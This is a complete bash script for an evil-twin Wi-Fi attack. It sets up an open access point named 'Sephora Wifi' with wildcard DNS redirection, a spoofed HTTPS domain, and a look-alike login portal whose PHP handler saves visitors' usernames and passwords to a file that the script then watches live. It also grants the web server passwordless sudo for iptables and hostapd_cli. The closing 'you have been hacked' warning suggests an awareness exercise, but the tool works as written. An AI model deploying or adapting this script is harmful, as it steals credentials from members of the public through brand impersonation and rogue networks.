#!/bin/bash

# Variables
WIFI_IFACE="wlan0"
ETH_IFACE="eth0"
WIFI_IP="192.168.1.1"
NETMASK="255.255.255.0"
DHCP_RANGE_START="192.168.1.100"
DHCP_RANGE_END="192.168.1.200"
DHCP_LEASE_TIME="12h"

ip_configuration () {
    
    echo "[+] Création de l'Access Point..."

    echo "[+] Configuration de $WIFI_IFACE avec IP statique."
    ip link set $WIFI_IFACE up
    ip addr flush dev $WIFI_IFACE
    ip addr add $WIFI_IP/24 dev $WIFI_IFACE

    echo "[+] Activation IP forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sed -i 's/^#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
    sysctl -p

}

ip_table () {
    echo "[+] Configuration des règles iptables..."
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    iptables -t nat -A POSTROUTING -o $ETH_IFACE -j MASQUERADE
    iptables -A FORWARD -i $WIFI_IFACE -o $ETH_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i $ETH_IFACE -o $WIFI_IFACE -j ACCEPT

    echo "[+] Configuration persistance des règles iptables..."
    apt install -y iptables-persistent
    iptables-save > /etc/iptables/rules.v4
}


dnsmasq_configuration (){
    # 4 Configure dnsmasq (DHCP + DNS)
    echo "[+] Configuration dnsmasq..."
    cat > /etc/dnsmasq.conf <<EOL
interface=$WIFI_IFACE
listen-address=$WIFI_IP
bind-interfaces
address=/#/192.168.1.1
dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,$DHCP_LEASE_TIME
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
EOL
    systemctl restart dnsmasq
}


hostapd_configuration () {
    echo "[+] Configuration hostapd..."
    cat > /etc/hostapd/hostapd.conf <<EOL
interface=$WIFI_IFACE
driver=nl80211
ssid=Sephora Wifi
hw_mode=g
channel=7
wpa=0
EOL
    sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
}

certificat_generation () {
    echo "[+] Génération du certificat SSL auto-signé..."
    openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/captive.key -x509 -days 365 -out /etc/ssl/certs/captive.crt -subj "/C=FR/ST=Paris/L=Paris/O=WiFi Public/CN=sephoraWifi.com"
}

set_captive_portal_html () {

    echo "[+] Configuration du portail captif..."
    mkdir -p /var/www/html/
    cat > /var/www/html/index.html <<EOF
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="UTF-8">
        <title>Connexion WiFi</title>
        <style>
            body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            form { width: 400px; text-align: center; }
            .logo-container { text-align: center; margin-bottom: 20px; }
            .logo-container img { max-width: 300px; height: auto; display: block; margin: 0 auto; }
            h2 { color: #333; margin-bottom: 20px; }
            input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
            input[type="submit"] { background-color: black; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; width: 90%; }
            input[type="submit"]:hover { background-color: #333; }
        </style>
    </head>
    <body>
        <form action="login.php" method="POST">
            <div class="logo-container">
                <img src="logo.png" alt="Logo">
            </div>
            <h2>Bienvenue</h2>
            <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
            <input type="password" name="password" placeholder="Mot de passe" required><br>
            <input type="submit" value="Connexion">
        </form>
    </body>
    </html>
EOF
    cp /var/www/html/index.html /var/www/html/hotspot-detect.html
}

set_captive_portal_php () {

    cat <<'EOF' > /var/www/html/login.php
    <?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $mac_raw = shell_exec("arp -a $ip | awk '{print $4}'");
    $mac = trim($mac_raw); // Nettoyage des espaces ou sauts de ligne

    file_put_contents("/var/www/html/logins.txt", $_POST['username'] . " : " . $_POST['password'] . "\n", FILE_APPEND);

    if (!empty($mac)) {
        // Appliquer les règles DNS pour l'adresse MAC spécifique
        exec("sudo iptables -t nat -A PREROUTING -m mac --mac-source $mac -p udp --dport 53 -j DNAT --to 8.8.8.8");
        exec("sudo iptables -t nat -A PREROUTING -m mac --mac-source $mac -p tcp --dport 53 -j DNAT --to 8.8.8.8");
    }

    // Déconnexion de l'utilisateur via hostapd_cli
    exec("sudo hostapd_cli deauthenticate $mac");

    // Afficher un message de confirmation
    echo "<!DOCTYPE html>";
    echo "<html lang='fr'>";
    echo "<head>";
    echo "<meta charset='UTF-8'>";
    echo "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    echo "<title>ATTENTION ! Sécurité Compromise</title>";
    echo "<style>";
    echo "body { background-color: black; color: red; font-family: Arial, sans-serif; text-align: center;";
    echo "display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }";
    echo ".container { max-width: 80%; padding: 20px; border: 2px solid red; border-radius: 10px; background-color: rgba(255, 0, 0, 0.1); }";
    echo "h1 { font-size: 3em; }";
    echo "p { font-size: 1.5em; margin-top: 20px; }";
    echo ".redirect { font-size: 1.2em; color: white; margin-top: 30px; }";
    echo "</style>";
    echo "</head>";
    echo "<body>";
    echo "<div class='container'>";
    echo "<h1>⚠ ATTENTION ! ⚠</h1>";
    echo "<p>Vous avez été piratés ! Faites attention aux identifiants que vous entrez sur Internet, cela peut vous porter préjudice.</p>";
    echo "<p class='redirect'>Vous allez être redirigé vers le site de Sephora...</p>";
    echo "</div>";
    echo "<script>";
    echo "setTimeout(function() { window.location.href = 'https://www.sephora.fr/'; }, 5000);";
    echo "</script>";
    echo "</body>";
    echo "</html>";
    exit();
    exit();
    ?>
EOF

}


pull_image () {

    # Définition des variables
    FILE="/var/www/html/logo.png"
    URL="https://logo-marque.com/wp-content/uploads/2022/02/Sephora-Logo.png"

    # Vérifier si le fichier existe
    if [ -f "$FILE" ]; then
        echo "Le fichier existe déjà : $FILE"
    else
        echo "Le fichier n'existe pas. Téléchargement en cours..."
        curl -o logo.png "$URL"

        # Vérifier si le téléchargement a réussi
        if [ -f "logo.png" ]; then
            echo "Téléchargement réussi, déplacement du fichier..."
            sudo mv logo.png "$FILE"
            echo "Fichier déplacé vers $FILE"
        else
            echo "Erreur : le téléchargement a échoué."
        fi
    fi

}

set_captive_portal_permissions () {

    touch /var/www/html/logins.txt
    chown www-data:www-data /var/www/html/logins.txt
    chmod 666 /var/www/html/logins.txt
    chmod 777 /var/www/html/login.php
    echo "www-data ALL=(ALL) NOPASSWD: /usr/sbin/hostapd_cli, /usr/sbin/iptables" >> /etc/sudoers

}

apache_configuration () {

    echo "[+] Configuration Apache pour HTTPS..."
    a2enmod ssl

    cat <<EOF > /etc/apache2/sites-available/captive.conf
        <VirtualHost *:443>
            ServerAdmin admin@sephoraWifi.com
            DocumentRoot /var/www/html
            ServerName sephoraWifi.com

            SSLEngine on
            SSLCertificateFile /etc/ssl/certs/captive.crt
            SSLCertificateKeyFile /etc/ssl/private/captive.key

            <Directory /var/www/html/>
                AllowOverride All
                Require all granted
            </Directory>

            ErrorLog \${APACHE_LOG_DIR}/error.log
            CustomLog \${APACHE_LOG_DIR}/access.log combined
        </VirtualHost>
EOF

    a2ensite captive
}

set_apache_redirection () {
    echo "[+] Activation de la redirection HTTP -> HTTPS..."
    cat <<EOF > /etc/apache2/sites-available/000-default.conf
    <VirtualHost *:80>
        ServerName sephoraWifi.com
        Redirect permanent / https://sephoraWifi.com/
    </VirtualHost>
EOF
}

set_hosts () {

    cat <<EOF > /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.1   sephoraWifi.com

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
EOF

}

big_restart () {
    echo "[+] Redémarrage des services"
    systemctl restart apache2

    systemctl unmask hostapd
    systemctl enable hostapd
    systemctl restart hostapd

    systemctl enable dnsmasq
    systemctl enable hostapd 

    echo "[+] Restarting NetworkManager..."
    systemctl restart NetworkManager
}

snif_snif () {
    echo "[+] L'Access point est enfin pret !"

    echo "Debut du snif de Credentials : "
    tail -f /var/www/html/logins.txt
}

main () {
    ip_configuration
    ip_table
    dnsmasq_configuration
    hostapd_configuration
    certificat_generation
    set_captive_portal_html
    set_captive_portal_php
    pull_image
    set_captive_portal_permissions
    apache_configuration
    set_apache_redirection
    set_hosts
    big_restart
    snif_snif
}

main
